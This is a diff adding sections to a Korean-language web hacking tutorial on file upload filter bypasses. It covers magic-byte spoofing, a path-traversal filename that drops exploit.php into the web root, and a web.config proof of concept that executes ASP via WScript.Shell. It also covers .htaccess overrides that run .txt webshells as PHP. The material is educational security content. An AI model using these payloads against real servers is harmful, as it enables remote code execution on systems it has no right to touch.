@@ -66,3 +66,93 @@ description: "Web hacking"
 >```
 >Content-Type: image/jpeg 
 >```
+
+### Magic Byte bypass (매직바이트 우회)
+
+Magic Byte(매직 바이트)는 File Signature처럼 앞에 처음 몇몇 바이트가 파일타입을 인식하는데 쓰이는것을 의미합니다.
+
+매직바이트를 확인할려면 다음과 같은 명령어를 써볼수 있습니다.
+
+```
+file website.jpg # 파일 타입 확인 명령어
+xxd website.jpg | head # 헥스데이터 명령어
+```
+
+여러 매직바이트들이 파일타입들에 따라 존재하게 되는데 다음과 같이 `.txt`파일을 `GIF87a`라는 매직바이트를 앞에 넣어서 사진파일로 인식시킬수 있습니다.
+
+```
+echo -n -e 'GIF87a' > file.txt
+```
+## File Upload from in user accessible directory (파일 업로드 위치 우회)
+
+웹서버에서 악성파일 업로드를 성공적으로 업로드를 했다 하여도, 여러 문제점들이 아직 남아있을수 있습니다.
+
+1. 업로드한 파일이 실행이 가능한가?
+2. 업로드한 파일의 PATH를 아는가?
+
+이러한 것들을 확인하기 위해서는 확실히 알아야될 것은 업로드가 되는 파일의 PATH를 알아야된다는 것입니다.
+
+이러한 우회로 파일업로드를 할때, `filename` 에서 Path Traversal 공격을 시도해 볼수 있습니다. 
+
+```
+Content-Disposition: form-data; name="avatar"; filename="../../../../../../../wwwroot/exploit.php"
+```
+웹사이트를 돌아다니면서 찾은 PATH들로 Path Traversal공격을 시도할수 있을것 입니다.
+
+## Overriding the Server Configuration (서버 설정 파일을 업로드해서 우회)
+
+앞서 말했다 싶이 웹 서버는 해당 파일을 실행하게 설정이 되지 않는이상 파일을 실행시키진 않습니다. 예를들어서 아파치 서버에 `.php` 파일을 사용자의 요청에 따라 실행하고 싶을 경우 `/etc/apache2/apache2.conf` 파일에 다음과 같은 설정을 했을것입니다.
+
+```
+LoadModule php_module /usr/lib/apache2/modules/libphp.so
+    AddType application/x-httpd-php .php
+```
+
+이러한 설정 파일 같이 여러 config파일들을 업로드해서 웹서버가 파일을 실행시키거나 config 파일 자체에서 악성 코드를 실행 시킬수 있게도 할 수 있습니다.
+
+### web.config RCE
+
+**Proof of Concept:**
+
+```asp.net
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Response.write("-"&"->")
+' it is running the ASP code if you can see 3 by opening the web.config file!
+Dim oShell, sCommand
+sCommand = ""
+Set oShell = Server.CreateObject("WScript.Shell")
+oShell.Run sCommand, , True
+Set oShell = Nothing
+Response.write("<!-"&"-")
+%>
+-->
+```
+### .htaccess RCE 
+
+`.htaccess` 는 아파치 웹 서버 디렉토리를 설정하는 기본적인 파일입니다. 만약 웹서버에 `.htaccess`를 Override 할 수 있다면, 다음과 같은 공격들을 수행 할수 있습니다.
+
+1. `AddType application/x-httpd-php .txt`를 `.htaccess` 파일을 올려 덮어씌운다음 `webshell.txt`등으로 `txt`파일을 업로드 하였지만 php로 실행시킬수 있을것 입니다.
+
+2. `php_flag engine off`를 사용할 경우, 엔진을 종료시켜 php코드가 유출이 됩니다.
+
+## Reference
+1. https://kangsecu.tistory.com/99
